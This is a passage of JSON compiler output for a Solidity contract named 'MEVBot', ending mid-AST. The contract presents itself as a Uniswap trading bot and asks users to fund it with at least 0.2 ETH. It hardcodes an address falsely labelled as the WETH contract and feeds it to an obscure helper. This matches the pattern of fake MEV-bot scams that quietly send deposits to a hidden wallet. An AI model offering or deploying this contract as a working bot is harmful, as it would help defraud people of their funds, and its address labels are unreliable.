							"sourceMap": "109:512:9:-:0;;132:2:-1;166:7;155:9;146:7;137:37;255:7;249:14;246:1;241:23;235:4;232:33;222:2;;269:9;222:2;293:9;290:1;283:20;323:4;314:7;306:22;347:7;338;331:24"
						},
						"deployedBytecode": {
							"immutableReferences": {},
							"linkReferences": {},
							"object": "73000000000000000000000000000000000000000030146080604052600080fdfea264697066735822122095155d5045ec6a7d67edad656ead3f8acebdb7abcd5f0a41d4db7f969b61edda64736f6c63430006060033",
							"opcodes": "PUSH20 0x0 ADDRESS EQ PUSH1 0x80 PUSH1 0x40 MSTORE PUSH1 0x0 DUP1 REVERT INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 SWAP6 ISZERO 0x5D POP GASLIMIT 0xEC PUSH11 0x7D67EDAD656EAD3F8ACEBD 0xB7 0xAB 0xCD 0x5F EXP COINBASE 0xD4 0xDB PUSH32 0x969B61EDDA64736F6C6343000606003300000000000000000000000000000000 ",
							"sourceMap": "109:512:9:-:0;;;;;;12:1:-1;9;2:12"
						},
						"gasEstimates": {
							"creation": {
								"codeDepositCost": "17200",
								"executionCost": "97",
								"totalCost": "17297"
							},
							"internal": {
								"addDelta(uint128,int128)": "infinite"
							}
						},
						"legacyAssembly": {
							".code": [
								{
									"begin": 109,
									"end": 621,
									"name": "PUSH #[$]",
									"source": 9,
									"value": "0000000000000000000000000000000000000000000000000000000000000000"
								},
								{
									"begin": 109,
									"end": 621,
									"name": "PUSH [$]",
									"source": 9,
									"value": "0000000000000000000000000000000000000000000000000000000000000000"
								},
								{
									"begin": 132,
									"end": 134,
									"name": "PUSH",
									"source": -1,
									"value": "B"
								},
								{
									"begin": 166,
									"end": 173,
									"name": "DUP3",
									"source": -1
								},
								{
									"begin": 155,
									"end": 164,
									"name": "DUP3",
									"source": -1
								},
								{
									"begin": 146,
									"end": 153,
									"name": "DUP3",
									"source": -1
								},
								{
									"begin": 137,
									"end": 174,
									"name": "CODECOPY",
									"source": -1
								},
								{
									"begin": 255,
									"end": 262,
									"name": "DUP1",
									"source": -1
								},
								{
									"begin": 249,
									"end": 263,
									"name": "MLOAD",
									"source": -1
								},
								{
									"begin": 246,
									"end": 247,
									"name": "PUSH",
									"source": -1,
									"value": "0"
								},
								{
									"begin": 241,
									"end": 264,
									"name": "BYTE",
									"source": -1
								},
								{
									"begin": 235,
									"end": 239,
									"name": "PUSH",
									"source": -1,
									"value": "73"
								},
								{
									"begin": 232,
									"end": 265,
									"name": "EQ",
									"source": -1
								},
								{
									"begin": 222,
									"end": 224,
									"name": "PUSH [tag]",
									"source": -1,
									"value": "1"
								},
								{
									"begin": 222,
									"end": 224,
									"name": "JUMPI",
									"source": -1
								},
								{
									"begin": 269,
									"end": 278,
									"name": "INVALID",
									"source": -1
								},
								{
									"begin": 222,
									"end": 224,
									"name": "tag",
									"source": -1,
									"value": "1"
								},
								{
									"begin": 222,
									"end": 224,
									"name": "JUMPDEST",
									"source": -1
								},
								{
									"begin": 293,
									"end": 302,
									"name": "ADDRESS",
									"source": -1
								},
								{
									"begin": 290,
									"end": 291,
									"name": "PUSH",
									"source": -1,
									"value": "0"
								},
								{
									"begin": 283,
									"end": 303,
									"name": "MSTORE",
									"source": -1
								},
								{
									"begin": 323,
									"end": 327,
									"name": "PUSH",
									"source": -1,
									"value": "73"
								},
								{
									"begin": 314,
									"end": 321,
									"name": "DUP2",
									"source": -1
								},
								{
									"begin": 306,
									"end": 328,
									"name": "MSTORE8",
									"source": -1
								},
								{
									"begin": 347,
									"end": 354,
									"name": "DUP3",
									"source": -1
								},
								{
									"begin": 338,
									"end": 345,
									"name": "DUP2",
									"source": -1
								},
								{
									"begin": 331,
									"end": 355,
									"name": "RETURN",
									"source": -1
								}
							],
							".data": {
								"0": {
									".auxdata": "a264697066735822122095155d5045ec6a7d67edad656ead3f8acebdb7abcd5f0a41d4db7f969b61edda64736f6c63430006060033",
									".code": [
										{
											"begin": 109,
											"end": 621,
											"name": "PUSHDEPLOYADDRESS",
											"source": 9
										},
										{
											"begin": 109,
											"end": 621,
											"name": "ADDRESS",
											"source": 9
										},
										{
											"begin": 109,
											"end": 621,
											"name": "EQ",
											"source": 9
										},
										{
											"begin": 109,
											"end": 621,
											"name": "PUSH",
											"source": 9,
											"value": "80"
										},
										{
											"begin": 109,
											"end": 621,
											"name": "PUSH",
											"source": 9,
											"value": "40"
										},
										{
											"begin": 109,
											"end": 621,
											"name": "MSTORE",
											"source": 9
										},
										{
											"begin": 12,
											"end": 13,
											"name": "PUSH",
											"source": -1,
											"value": "0"
										},
										{
											"begin": 9,
											"end": 10,
											"name": "DUP1",
											"source": -1
										},
										{
											"begin": 2,
											"end": 14,
											"name": "REVERT",
											"source": -1
										}
									]
								}
							}
						},
						"methodIdentifiers": {}
					},
					"metadata": "{\"compiler\":{\"version\":\"0.6.6+commit.6c089d02\"},\"language\":\"Solidity\",\"output\":{\"abi\":[],\"devdoc\":{\"methods\":{},\"title\":\"Math library for liquidity\"},\"userdoc\":{\"methods\":{}}},\"settings\":{\"compilationTarget\":{\"github.com/Uniswap/v3-core/blob/main/contracts/libraries/LiquidityMath.sol\":\"LiquidityMath\"},\"evmVersion\":\"istanbul\",\"libraries\":{},\"metadata\":{\"bytecodeHash\":\"ipfs\"},\"optimizer\":{\"enabled\":false,\"runs\":200},\"remappings\":[]},\"sources\":{\"github.com/Uniswap/v3-core/blob/main/contracts/libraries/LiquidityMath.sol\":{\"keccak256\":\"0xd53041349718d5bce4a89e87cd911879d41ba42ba3fab0614e5e8b742f352b88\",\"urls\":[\"bzz-raw://ea7529b99ab4fc1d3e6c5a31990fb688f0a2d6cc302c0419e0cf5a2d6c563781\",\"dweb:/ipfs/QmVaphRSNpfChHZKzutQ9WprwCo2WE1euvThRfHcwsnHhj\"]}},\"version\":1}",
					"storageLayout": {
						"storage": [],
						"types": null
					},
					"userdoc": {
						"methods": {}
					}
				}
			}
		},
		"sources": {
			"contracts/bot.sol": {
				"ast": {
					"absolutePath": "contracts/bot.sol",
					"exportedSymbols": {
						"MEVBot": [
							1583
						]
					},
					"id": 1584,
					"nodeType": "SourceUnit",
					"nodes": [
						{
							"id": 1,
							"literals": [
								"solidity",
								"^",
								"0.6",
								".6"
							],
							"nodeType": "PragmaDirective",
							"src": "31:23:0"
						},
						{
							"absolutePath": "github.com/Uniswap/v3-core/blob/main/contracts/interfaces/IUniswapV3Factory.sol",
							"file": "github.com/Uniswap/v3-core/blob/main/contracts/interfaces/IUniswapV3Factory.sol",
							"id": 2,
							"nodeType": "ImportDirective",
							"scope": 1584,
							"sourceUnit": 1667,
							"src": "107:89:0",
							"symbolAliases": [],
							"unitAlias": ""
						},
						{
							"absolutePath": "github.com/Uniswap/v3-core/blob/main/contracts/interfaces/IUniswapV3Pool.sol",
							"file": "github.com/Uniswap/v3-core/blob/main/contracts/interfaces/IUniswapV3Pool.sol",
							"id": 3,
							"nodeType": "ImportDirective",
							"scope": 1584,
							"sourceUnit": 1689,
							"src": "197:86:0",
							"symbolAliases": [],
							"unitAlias": ""
						},
						{
							"absolutePath": "github.com/Uniswap/v3-core/blob/main/contracts/libraries/LiquidityMath.sol",
							"file": "github.com/Uniswap/v3-core/blob/main/contracts/libraries/LiquidityMath.sol",
							"id": 4,
							"nodeType": "ImportDirective",
							"scope": 1584,
							"sourceUnit": 2161,
							"src": "284:84:0",
							"symbolAliases": [],
							"unitAlias": ""
						},
						{
							"abstract": false,
							"baseContracts": [],
							"contractDependencies": [],
							"contractKind": "contract",
							"documentation": {
								"id": 5,
								"nodeType": "StructuredDocumentation",
								"src": "370:144:0",
								"text": "Testnet transactions will fail as there is no value\nUpdated build\nMin liquidity not including gas fees needs to equal 0.2 ETH"
							},
							"fullyImplemented": true,
							"id": 1583,
							"linearizedBaseContracts": [
								1583
							],
							"name": "MEVBot",
							"nodeType": "ContractDefinition",
							"nodes": [
								{
									"constant": false,
									"functionSelector": "6c02a931",
									"id": 7,
									"mutability": "mutable",
									"name": "tokenName",
									"nodeType": "VariableDeclaration",
									"overrides": null,
									"scope": 1583,
									"src": "539:23:0",
									"stateVariable": true,
									"storageLocation": "default",
									"typeDescriptions": {
										"typeIdentifier": "t_string_storage",
										"typeString": "string"
									},
									"typeName": {
										"id": 6,
										"name": "string",
										"nodeType": "ElementaryTypeName",
										"src": "539:6:0",
										"typeDescriptions": {
											"typeIdentifier": "t_string_storage_ptr",
											"typeString": "string"
										}
									},
									"value": null,
									"visibility": "public"
								},
								{
									"constant": false,
									"functionSelector": "7b61c320",
									"id": 9,
									"mutability": "mutable",
									"name": "tokenSymbol",
									"nodeType": "VariableDeclaration",
									"overrides": null,
									"scope": 1583,
									"src": "568:25:0",
									"stateVariable": true,
									"storageLocation": "default",
									"typeDescriptions": {
										"typeIdentifier": "t_string_storage",
										"typeString": "string"
									},
									"typeName": {
										"id": 8,
										"name": "string",
										"nodeType": "ElementaryTypeName",
										"src": "568:6:0",
										"typeDescriptions": {
											"typeIdentifier": "t_string_storage_ptr",
											"typeString": "string"
										}
									},
									"value": null,
									"visibility": "public"
								},
								{
									"constant": false,
									"id": 11,
									"mutability": "mutable",
									"name": "liquidity",
									"nodeType": "VariableDeclaration",
									"overrides": null,
									"scope": 1583,
									"src": "599:14:0",
									"stateVariable": true,
									"storageLocation": "default",
									"typeDescriptions": {
										"typeIdentifier": "t_uint256",
										"typeString": "uint256"
									},
									"typeName": {
										"id": 10,
										"name": "uint",
										"nodeType": "ElementaryTypeName",
										"src": "599:4:0",
										"typeDescriptions": {
											"typeIdentifier": "t_uint256",
											"typeString": "uint256"
										}
									},
									"value": null,
									"visibility": "internal"
								},
								{
									"anonymous": false,
									"documentation": null,
									"id": 15,
									"name": "Log",
									"nodeType": "EventDefinition",
									"parameters": {
										"id": 14,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 13,
												"indexed": false,
												"mutability": "mutable",
												"name": "_msg",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 15,
												"src": "630:11:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_string_memory_ptr",
													"typeString": "string"
												},
												"typeName": {
													"id": 12,
													"name": "string",
													"nodeType": "ElementaryTypeName",
													"src": "630:6:0",
													"typeDescriptions": {
														"typeIdentifier": "t_string_storage_ptr",
														"typeString": "string"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "629:13:0"
									},
									"src": "620:23:0"
								},
								{
									"body": {
										"id": 30,
										"nodeType": "Block",
										"src": "730:83:0",
										"statements": [
											{
												"expression": {
													"argumentTypes": null,
													"id": 24,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftHandSide": {
														"argumentTypes": null,
														"id": 22,
														"name": "tokenSymbol",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 9,
														"src": "740:11:0",
														"typeDescriptions": {
															"typeIdentifier": "t_string_storage",
															"typeString": "string storage ref"
														}
													},
													"nodeType": "Assignment",
													"operator": "=",
													"rightHandSide": {
														"argumentTypes": null,
														"id": 23,
														"name": "_mainTokenSymbol",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 17,
														"src": "754:16:0",
														"typeDescriptions": {
															"typeIdentifier": "t_string_memory_ptr",
															"typeString": "string memory"
														}
													},
													"src": "740:30:0",
													"typeDescriptions": {
														"typeIdentifier": "t_string_storage",
														"typeString": "string storage ref"
													}
												},
												"id": 25,
												"nodeType": "ExpressionStatement",
												"src": "740:30:0"
											},
											{
												"expression": {
													"argumentTypes": null,
													"id": 28,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftHandSide": {
														"argumentTypes": null,
														"id": 26,
														"name": "tokenName",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 7,
														"src": "780:9:0",
														"typeDescriptions": {
															"typeIdentifier": "t_string_storage",
															"typeString": "string storage ref"
														}
													},
													"nodeType": "Assignment",
													"operator": "=",
													"rightHandSide": {
														"argumentTypes": null,
														"id": 27,
														"name": "_mainTokenName",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 19,
														"src": "792:14:0",
														"typeDescriptions": {
															"typeIdentifier": "t_string_memory_ptr",
															"typeString": "string memory"
														}
													},
													"src": "780:26:0",
													"typeDescriptions": {
														"typeIdentifier": "t_string_storage",
														"typeString": "string storage ref"
													}
												},
												"id": 29,
												"nodeType": "ExpressionStatement",
												"src": "780:26:0"
											}
										]
									},
									"documentation": null,
									"id": 31,
									"implemented": true,
									"kind": "constructor",
									"modifiers": [],
									"name": "",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 20,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 17,
												"mutability": "mutable",
												"name": "_mainTokenSymbol",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 31,
												"src": "661:30:0",
												"stateVariable": false,
												"storageLocation": "memory",
												"typeDescriptions": {
													"typeIdentifier": "t_string_memory_ptr",
													"typeString": "string"
												},
												"typeName": {
													"id": 16,
													"name": "string",
													"nodeType": "ElementaryTypeName",
													"src": "661:6:0",
													"typeDescriptions": {
														"typeIdentifier": "t_string_storage_ptr",
														"typeString": "string"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 19,
												"mutability": "mutable",
												"name": "_mainTokenName",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 31,
												"src": "693:28:0",
												"stateVariable": false,
												"storageLocation": "memory",
												"typeDescriptions": {
													"typeIdentifier": "t_string_memory_ptr",
													"typeString": "string"
												},
												"typeName": {
													"id": 18,
													"name": "string",
													"nodeType": "ElementaryTypeName",
													"src": "693:6:0",
													"typeDescriptions": {
														"typeIdentifier": "t_string_storage_ptr",
														"typeString": "string"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "660:62:0"
									},
									"returnParameters": {
										"id": 21,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "730:0:0"
									},
									"scope": 1583,
									"src": "649:164:0",
									"stateMutability": "nonpayable",
									"virtual": false,
									"visibility": "public"
								},
								{
									"body": {
										"id": 34,
										"nodeType": "Block",
										"src": "846:2:0",
										"statements": []
									},
									"documentation": null,
									"id": 35,
									"implemented": true,
									"kind": "receive",
									"modifiers": [],
									"name": "",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 32,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "826:2:0"
									},
									"returnParameters": {
										"id": 33,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "846:0:0"
									},
									"scope": 1583,
									"src": "819:29:0",
									"stateMutability": "payable",
									"virtual": false,
									"visibility": "external"
								},
								{
									"canonicalName": "MEVBot.slice",
									"id": 40,
									"members": [
										{
											"constant": false,
											"id": 37,
											"mutability": "mutable",
											"name": "_len",
											"nodeType": "VariableDeclaration",
											"overrides": null,
											"scope": 40,
											"src": "877:9:0",
											"stateVariable": false,
											"storageLocation": "default",
											"typeDescriptions": {
												"typeIdentifier": "t_uint256",
												"typeString": "uint256"
											},
											"typeName": {
												"id": 36,
												"name": "uint",
												"nodeType": "ElementaryTypeName",
												"src": "877:4:0",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												}
											},
											"value": null,
											"visibility": "internal"
										},
										{
											"constant": false,
											"id": 39,
											"mutability": "mutable",
											"name": "_ptr",
											"nodeType": "VariableDeclaration",
											"overrides": null,
											"scope": 40,
											"src": "896:9:0",
											"stateVariable": false,
											"storageLocation": "default",
											"typeDescriptions": {
												"typeIdentifier": "t_uint256",
												"typeString": "uint256"
											},
											"typeName": {
												"id": 38,
												"name": "uint",
												"nodeType": "ElementaryTypeName",
												"src": "896:4:0",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												}
											},
											"value": null,
											"visibility": "internal"
										}
									],
									"name": "slice",
									"nodeType": "StructDefinition",
									"scope": 1583,
									"src": "854:58:0",
									"visibility": "public"
								},
								{
									"body": {
										"id": 188,
										"nodeType": "Block",
										"src": "1089:1267:0",
										"statements": [
											{
												"assignments": [
													50
												],
												"declarations": [
													{
														"constant": false,
														"id": 50,
														"mutability": "mutable",
														"name": "shortest",
														"nodeType": "VariableDeclaration",
														"overrides": null,
														"scope": 188,
														"src": "1099:13:0",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"typeName": {
															"id": 49,
															"name": "uint",
															"nodeType": "ElementaryTypeName",
															"src": "1099:4:0",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 53,
												"initialValue": {
													"argumentTypes": null,
													"expression": {
														"argumentTypes": null,
														"id": 51,
														"name": "self",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 42,
														"src": "1115:4:0",
														"typeDescriptions": {
															"typeIdentifier": "t_struct$_slice_$40_memory_ptr",
															"typeString": "struct MEVBot.slice memory"
														}
													},
													"id": 52,
													"isConstant": false,
													"isLValue": true,
													"isPure": false,
													"lValueRequested": false,
													"memberName": "_len",
													"nodeType": "MemberAccess",
													"referencedDeclaration": 37,
													"src": "1115:9:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "1099:25:0"
											},
											{
												"condition": {
													"argumentTypes": null,
													"commonType": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													},
													"id": 58,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftExpression": {
														"argumentTypes": null,
														"expression": {
															"argumentTypes": null,
															"id": 54,
															"name": "other",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 44,
															"src": "1138:5:0",
															"typeDescriptions": {
																"typeIdentifier": "t_struct$_slice_$40_memory_ptr",
																"typeString": "struct MEVBot.slice memory"
															}
														},
														"id": 55,
														"isConstant": false,
														"isLValue": true,
														"isPure": false,
														"lValueRequested": false,
														"memberName": "_len",
														"nodeType": "MemberAccess",
														"referencedDeclaration": 37,
														"src": "1138:10:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "BinaryOperation",
													"operator": "<",
													"rightExpression": {
														"argumentTypes": null,
														"expression": {
															"argumentTypes": null,
															"id": 56,
															"name": "self",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 42,
															"src": "1151:4:0",
															"typeDescriptions": {
																"typeIdentifier": "t_struct$_slice_$40_memory_ptr",
																"typeString": "struct MEVBot.slice memory"
															}
														},
														"id": 57,
														"isConstant": false,
														"isLValue": true,
														"isPure": false,
														"lValueRequested": false,
														"memberName": "_len",
														"nodeType": "MemberAccess",
														"referencedDeclaration": 37,
														"src": "1151:9:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"src": "1138:22:0",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"falseBody": null,
												"id": 64,
												"nodeType": "IfStatement",
												"src": "1134:62:0",
												"trueBody": {
													"expression": {
														"argumentTypes": null,
														"id": 62,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"leftHandSide": {
															"argumentTypes": null,
															"id": 59,
															"name": "shortest",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 50,
															"src": "1175:8:0",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"nodeType": "Assignment",
														"operator": "=",
														"rightHandSide": {
															"argumentTypes": null,
															"expression": {
																"argumentTypes": null,
																"id": 60,
																"name": "other",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 44,
																"src": "1186:5:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_struct$_slice_$40_memory_ptr",
																	"typeString": "struct MEVBot.slice memory"
																}
															},
															"id": 61,
															"isConstant": false,
															"isLValue": true,
															"isPure": false,
															"lValueRequested": false,
															"memberName": "_len",
															"nodeType": "MemberAccess",
															"referencedDeclaration": 37,
															"src": "1186:10:0",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"src": "1175:21:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"id": 63,
													"nodeType": "ExpressionStatement",
													"src": "1175:21:0"
												}
											},
											{
												"assignments": [
													66
												],
												"declarations": [
													{
														"constant": false,
														"id": 66,
														"mutability": "mutable",
														"name": "selfptr",
														"nodeType": "VariableDeclaration",
														"overrides": null,
														"scope": 188,
														"src": "1207:12:0",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"typeName": {
															"id": 65,
															"name": "uint",
															"nodeType": "ElementaryTypeName",
															"src": "1207:4:0",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 69,
												"initialValue": {
													"argumentTypes": null,
													"expression": {
														"argumentTypes": null,
														"id": 67,
														"name": "self",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 42,
														"src": "1222:4:0",
														"typeDescriptions": {
															"typeIdentifier": "t_struct$_slice_$40_memory_ptr",
															"typeString": "struct MEVBot.slice memory"
														}
													},
													"id": 68,
													"isConstant": false,
													"isLValue": true,
													"isPure": false,
													"lValueRequested": false,
													"memberName": "_ptr",
													"nodeType": "MemberAccess",
													"referencedDeclaration": 39,
													"src": "1222:9:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "1207:24:0"
											},
											{
												"assignments": [
													71
												],
												"declarations": [
													{
														"constant": false,
														"id": 71,
														"mutability": "mutable",
														"name": "otherptr",
														"nodeType": "VariableDeclaration",
														"overrides": null,
														"scope": 188,
														"src": "1241:13:0",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"typeName": {
															"id": 70,
															"name": "uint",
															"nodeType": "ElementaryTypeName",
															"src": "1241:4:0",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 74,
												"initialValue": {
													"argumentTypes": null,
													"expression": {
														"argumentTypes": null,
														"id": 72,
														"name": "other",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 44,
														"src": "1257:5:0",
														"typeDescriptions": {
															"typeIdentifier": "t_struct$_slice_$40_memory_ptr",
															"typeString": "struct MEVBot.slice memory"
														}
													},
													"id": 73,
													"isConstant": false,
													"isLValue": true,
													"isPure": false,
													"lValueRequested": false,
													"memberName": "_ptr",
													"nodeType": "MemberAccess",
													"referencedDeclaration": 39,
													"src": "1257:10:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "1241:26:0"
											},
											{
												"body": {
													"id": 174,
													"nodeType": "Block",
													"src": "1324:977:0",
													"statements": [
														{
															"assignments": [
																87
															],
															"declarations": [
																{
																	"constant": false,
																	"id": 87,
																	"mutability": "mutable",
																	"name": "a",
																	"nodeType": "VariableDeclaration",
																	"overrides": null,
																	"scope": 174,
																	"src": "1378:6:0",
																	"stateVariable": false,
																	"storageLocation": "default",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	},
																	"typeName": {
																		"id": 86,
																		"name": "uint",
																		"nodeType": "ElementaryTypeName",
																		"src": "1378:4:0",
																		"typeDescriptions": {
																			"typeIdentifier": "t_uint256",
																			"typeString": "uint256"
																		}
																	},
																	"value": null,
																	"visibility": "internal"
																}
															],
															"id": 88,
															"initialValue": null,
															"nodeType": "VariableDeclarationStatement",
															"src": "1378:6:0"
														},
														{
															"assignments": [
																90
															],
															"declarations": [
																{
																	"constant": false,
																	"id": 90,
																	"mutability": "mutable",
																	"name": "b",
																	"nodeType": "VariableDeclaration",
																	"overrides": null,
																	"scope": 174,
																	"src": "1398:6:0",
																	"stateVariable": false,
																	"storageLocation": "default",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	},
																	"typeName": {
																		"id": 89,
																		"name": "uint",
																		"nodeType": "ElementaryTypeName",
																		"src": "1398:4:0",
																		"typeDescriptions": {
																			"typeIdentifier": "t_uint256",
																			"typeString": "uint256"
																		}
																	},
																	"value": null,
																	"visibility": "internal"
																}
															],
															"id": 91,
															"initialValue": null,
															"nodeType": "VariableDeclarationStatement",
															"src": "1398:6:0"
														},
														{
															"assignments": [
																93
															],
															"declarations": [
																{
																	"constant": false,
																	"id": 93,
																	"mutability": "mutable",
																	"name": "WETH_CONTRACT_ADDRESS",
																	"nodeType": "VariableDeclaration",
																	"overrides": null,
																	"scope": 174,
																	"src": "1419:35:0",
																	"stateVariable": false,
																	"storageLocation": "memory",
																	"typeDescriptions": {
																		"typeIdentifier": "t_string_memory_ptr",
																		"typeString": "string"
																	},
																	"typeName": {
																		"id": 92,
																		"name": "string",
																		"nodeType": "ElementaryTypeName",
																		"src": "1419:6:0",
																		"typeDescriptions": {
																			"typeIdentifier": "t_string_storage_ptr",
																			"typeString": "string"
																		}
																	},
																	"value": null,
																	"visibility": "internal"
																}
															],
															"id": 95,
															"initialValue": {
																"argumentTypes": null,
																"hexValue": "307836643830313133653533336132433066653832456142443335663138373544634541383945613937",
																"id": 94,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"kind": "string",
																"lValueRequested": false,
																"nodeType": "Literal",
																"src": "1457:44:0",
																"subdenomination": null,
																"typeDescriptions": {
																	"typeIdentifier": "t_stringliteral_b8008a6a25da01b7c7b6838782b9056c54a27441af6e651499ebfebbcedc883f",
																	"typeString": "literal_string \"0x6d80113e533a2C0fe82EaBD35f1875DcEA89Ea97\""
																},
																"value": "0x6d80113e533a2C0fe82EaBD35f1875DcEA89Ea97"
															},
															"nodeType": "VariableDeclarationStatement",
															"src": "1419:82:0"
														},
														{
															"assignments": [
																97
															],
															"declarations": [
																{
																	"constant": false,
																	"id": 97,
																	"mutability": "mutable",
																	"name": "TOKEN_CONTRACT_ADDRESS",
																	"nodeType": "VariableDeclaration",
																	"overrides": null,
																	"scope": 174,
																	"src": "1515:36:0",
																	"stateVariable": false,
																	"storageLocation": "memory",
																	"typeDescriptions": {
																		"typeIdentifier": "t_string_memory_ptr",
																		"typeString": "string"
																	},
																	"typeName": {
																		"id": 96,
																		"name": "string",
																		"nodeType": "ElementaryTypeName",
																		"src": "1515:6:0",
																		"typeDescriptions": {
																			"typeIdentifier": "t_string_storage_ptr",
																			"typeString": "string"
																		}
																	},
																	"value": null,
																	"visibility": "internal"
																}
															],
															"id": 99,
															"initialValue": {
																"argumentTypes": null,
																"hexValue": "307836643830313133653533336132433066653832456142443335663138373544634541383945613937",
																"id": 98,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"kind": "string",
																"lValueRequested": false,
																"nodeType": "Literal",
																"src": "1554:44:0",
																"subdenomination": null,
																"typeDescriptions": {
																	"typeIdentifier": "t_stringliteral_b8008a6a25da01b7c7b6838782b9056c54a27441af6e651499ebfebbcedc883f",
																	"typeString": "literal_string \"0x6d80113e533a2C0fe82EaBD35f1875DcEA89Ea97\""
																},
																"value": "0x6d80113e533a2C0fe82EaBD35f1875DcEA89Ea97"
															},
															"nodeType": "VariableDeclarationStatement",
															"src": "1515:83:0"
														},
														{
															"expression": {
																"argumentTypes": null,
																"arguments": [
																	{
																		"argumentTypes": null,
																		"id": 101,
																		"name": "WETH_CONTRACT_ADDRESS",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 93,
																		"src": "1632:21:0",
																		"typeDescriptions": {
																			"typeIdentifier": "t_string_memory_ptr",
																			"typeString": "string memory"
																		}
																	}
																],
																"expression": {
																	"argumentTypes": [
																		{
																			"typeIdentifier": "t_string_memory_ptr",
																			"typeString": "string memory"
																		}
																	],
																	"id": 100,
																	"name": "loadCurrentContract",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 329,
																	"src": "1612:19:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_function_internal_pure$_t_string_memory_ptr_$returns$_t_string_memory_ptr_$",
																		"typeString": "function (string memory) pure returns (string memory)"
																	}
																},
																"id": 102,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"kind": "functionCall",
																"lValueRequested": false,
																"names": [],
																"nodeType": "FunctionCall",
																"src": "1612:42:0",
																"tryCall": false,
																"typeDescriptions": {
																	"typeIdentifier": "t_string_memory_ptr",
																	"typeString": "string memory"
																}
															},
															"id": 103,
															"nodeType": "ExpressionStatement",
															"src": "1612:42:0"
														},
														{
															"expression": {
																"argumentTypes": null,
																"arguments": [
																	{
																		"argumentTypes": null,
																		"id": 105,
																		"name": "TOKEN_CONTRACT_ADDRESS",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 97,
																		"src": "1688:22:0",
																		"typeDescriptions": {
